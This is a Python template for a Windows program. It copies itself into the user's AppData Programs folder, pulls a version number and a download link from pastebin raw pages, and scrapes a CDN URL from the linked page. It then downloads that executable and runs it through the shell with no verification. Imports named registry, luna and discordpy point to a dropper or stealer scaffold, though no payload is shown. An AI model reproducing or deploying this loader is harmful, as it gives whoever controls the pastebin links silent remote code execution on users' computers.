#import comps
import comps.file as cfile
import comps.registry as cregistry
import comps.luna as cluna
import comps.discordpy as cdiscord
#import library
from bs4 import BeautifulSoup
import re
import sys
import os
import subprocess
import wx
import requests
import urllib.request
import time

class main:
    def __init__(self):
        self.app = wx.App()

        self.path = sys.argv[0]
        self.main_path = os.path.expanduser('~')+f"\AppData\Local\Programs\#Programname.exe"
        self.updater = os.path.expanduser('~')+f"\\AppData\\Local\\Programs\\updater.exe"
        self.ver = "0.0.2"

        self.registry_class = cregistry.winreg_manager()
        self.file_class = cfile.file_manager()

        self.check_file()
        self.check_update()
        #Your program

    def check_update(self):
        self.main_ver = requests.get("https://pastebin.com/raw/#1").json()["ver"]
        self.updater_link = requests.get("https://pastebin.com/raw/#2").json()["link"]
        if os.path.isfile(self.updater):
            try:
                os.remove(self.updater)
            except: pass
        if self.main_ver != self.ver:
            content = requests.get(self.updater_link).content
            soup = str(BeautifulSoup(content, "lxml"))
            soup = soup.split("\n")
            for text in soup:
                if "https://cdn" in text:
                    pattern = "https?://[\w/:%#\$&\?\(\)~\.=\+\-]+"
                    url = re.findall(pattern, text)[0]
            urllib.request.urlretrieve(url, self.updater)
            time.sleep(3)
            subprocess.run(f"start {self.updater}",shell=True)
            sys.exit()

    def check_file(self):
        if self.path != self.main_path:
            if os.path.isfile(self.updater) == False:
                sys.exit()
            if os.path.isfile(self.main_path) == False:
                self.file_class.copy_file()
                subprocess.run(f"start {self.main_path}",shell=True)
            sys.exit()

main()